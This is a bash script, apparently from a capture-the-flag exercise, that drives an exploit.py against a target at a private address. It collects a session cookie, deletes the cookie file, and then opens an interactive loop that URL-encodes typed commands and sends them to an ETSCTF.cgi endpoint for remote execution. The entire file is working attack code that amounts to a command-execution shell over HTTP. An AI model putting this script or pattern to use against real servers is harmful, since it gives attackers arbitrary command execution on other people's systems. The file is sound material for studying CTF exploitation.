#!/bin/bash

target="10.0.100.172:8080"
username="ETSCTF"
exploit_file="./exploit.py"

python3 "$exploit_file" -t "$target" -u "$username"

# Read the cookie from needed.txt and delete the file
cookie=$(<needed.txt)
rm -f needed.txt  # Delete the file after reading

cookie_header="Cookie: $cookie"

echo "Executing first curl command..."
curl -H "Authorization: Digest username=$username" -H "$cookie_header" -s -f "http://$target/"

echo "Executing second curl command..."
curl -H "Authorization: Digest username=$username" -H "$cookie_header" "http://$target/ETSCTF.cgi"

url_encode() {
    local string="$1"
    local encoded=""
    for (( i=0; i<${#string}; i++ )); do
        local c="${string:i:1}"
        case "$c" in
            [a-zA-Z0-9.~_-]) encoded+="$c" ;;
            *) printf -v encoded "%s%%%02X" "$encoded" "'$c" ;;
        esac
    done
    echo "$encoded"
}

while true; do
    echo
    echo "============================================"
    echo "         Command Execution Interface        "
    echo "============================================"
    echo " Please enter the command you want to execute "
    echo " (e.g., 'id') or type 'exit' to quit:"
    echo "--------------------------------------------"
    
    read -p "> " command
    
    if [ "$command" == "exit" ]; then
        echo "Exiting command execution."
        break
    fi
    
    if [ -z "$command" ]; then
        echo "Command cannot be empty. Please enter a valid command."
        continue
    fi
    
    encoded_command=$(url_encode "$command")
    
    echo "Executing command..."
    response=$(curl -H "Authorization: Digest username=$username" -H "$cookie_header" "http://$target/ETSCTF.cgi?ETSCTF=$encoded_command" -s)
    
    echo "--------------------------------------------"
    echo " Response:"
    echo "$response"
    echo "--------------------------------------------"
    echo
done
